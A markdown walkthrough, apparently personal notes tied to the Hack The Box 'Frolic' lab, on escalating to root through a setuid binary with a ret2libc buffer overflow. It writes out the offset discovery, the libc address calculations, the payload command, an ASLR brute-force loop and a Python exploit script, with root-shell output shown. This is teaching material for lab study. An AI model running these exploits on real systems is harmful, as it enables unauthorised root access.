# ROP
### by @shell5

#### Steps
1. [ ] Find a binary with [setuid](https://en.wikipedia.org/wiki/Setuid "wikipedia")

```bash

shell5@madrid:/tmp$ find / -perm -4000 2>/dev/null
/root/gitlab/sec/rop/exemplos/frolic/rop

shell5@madrid:/root/gitlab/sec/rop/exemplos/frolic$ ls -l
total 8
-rwsr-xr-x 1 root root 7480 Sep 25 00:59 rop
```

2. [ ] Check if system is vulnerable - check if [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is disabled 
	- `cat /proc/sys/kernel/randomize_va_space`

```bash
shell5@madrid:~/rop/exemplos/frolic$ cat /proc/sys/kernel/randomize_va_space
0
```

3. [ ] Check binary security
	- `gdb ./rop`
	- `checksec`
	- `/rop/scripts/pwnAPP.py ./rop`


```bash
shell5@madrid:~/rop/exemplos/frolic$ gdb ./rop 

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

ou 

```bash
shell5@madrid:~/rop/exemplos/frolic$ /rop/scripts/pwnAPP.py ./rop 
[*] '/rop/exemplos/01_frolic/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
ContextType(arch = 'i386', binary = ELF('/rop/exemplos/01_frolic/rop'), bits = 32, endian = 'little', os = 'linux')
```


4. [ ] Check for overflow
	- `for i in $(seq 10 10 200); do ./rop $(python -c "print('A' * $i)") && echo ; done`
	- `./rop $(python3 -c 'print("A" * 100, end="")')`


```bash
shell5@madrid:~/rop/exemplos/frolic$ for i in $(seq 10 10 200); do ./rop $(python -c "print('A' * $i)") && echo ; done
[+] Message sent: AAAAAAAAAA
[+] Message sent: AAAAAAAAAAAAAAAAAAAA
[+] Message sent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Message sent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
Segmentation fault
```

5. [ ] Find buffer size
	- `pattern create TAM` TAM is the size of the ppatern
	- `run PATTERN` with created pattern
	- `pattern offset EIPVALUE` value in EIP register

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x79 ('y')
EBX: 0xffffd150 --> 0x2
ECX: 0x0
EDX: 0xf7f99890 --> 0x0
ESI: 0xf7f98000 --> 0x1d5d8c
EDI: 0x0
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd120 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]

gdb-peda$ pattern offset AAGA
AAGA found at offset: 52
```

6. [ ] Find address of libc version used in binary
	- `ldd ./rop`

```bash
shell5@madrid:~/rop/exemplos/frolic$ ldd rop
        linux-gate.so.1 (0xf7fd3000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dcd000)    <-- this
        /lib/ld-linux.so.2 (0xf7fd4000)
```

7. [ ] Find address of "system" in libc
	- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"`

```bash
shell5@madrid:~/rop/exemplos/frolic$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"
  1528: 000426e0    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0

system -> 0x000426e0
system -> libc + system 
gdb-peda$ p 0xf7dcd000 + 0x000426e0

system -> 0x f7 e0 f6 e0 --> little endian --> \xe0\xf6\xe0\xf7
```

8. [ ] Find address of "exit" in libc
	- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"`

```bash
shell5@madrid:~/rop/exemplos/frolic$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"
   150: 000357a0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0

exit -> 0x000357a0
exit -> libc + system 
gdb-peda$ p 0xf7dcd000 + 0x000357a0

exit -> 0x f7 e0 27 a0 --> little endian --> \xa0\x27\xe0\xf7
```

9. [ ] Find address of "/bin/sh" in libc
	- `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`

```bash
shell5@madrid:~/rop/exemplos/frolic$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 17ff68 /bin/sh

sh -> 0x17ff68
sh -> libc + system 
gdb-peda$ p 0xf7dcd000 + 0x17ff68

sh -> 0x f7 f4 cf 68 --> little endian --> \x68\xcf\xf4\xf7
```

10. [ ] execute the binary with the payload
	- `./rop $(python -c 'print("a"*52 + system + exit + sh )')`

```bash
shell5@madrid:~/rop/exemplos/frolic$ ./rop $(python -c 'print("\x90"*52 + "\xe0\xf6\xe0\xf7" + "\xa0\x27\xe0\xf7" + "\x68\xcf\xf4\xf7" )')
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

11. [ ] ASLR enabled
	- 
```bash
while true; do ./ovrflw $(python -c 'print "\x90"*112 +  "\xe0\xf6\xe0\xf7" + "\xa0\x27\xe0\xf7" + "\x68\xcf\xf4\xf7"'); done
```

12. [] Python script

```python
#!/usr/bin/python

import struct

buf = "\x90" * 52
system = struct.pack("I" ,0xf7e0f6e0)
exit = struct.pack("I" ,0xf7e027a0)
shell = struct.pack("I" ,0xf7f4cf68)
print buf + system + exit + shell
```

```bash
shell5@madrid:~/rop/exemplos/frolic$ ./rop $(python ./template_local.py)
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

Bookmarks

ippsec bitterman

https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/

https://0xdf.gitlab.io/2019/03/23/htb-frolic.html#privesc-www-data--root

https://0xrick.github.io/hack-the-box/frolic/

https://0xdf.gitlab.io/2019/03/26/htb-october.html



https://0xrick.github.io/categories/#binary-exploitation

https://niiconsulting.com/checkmate/2019/09/exploiting-buffer-overflow-using-return-to-libc/

http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html
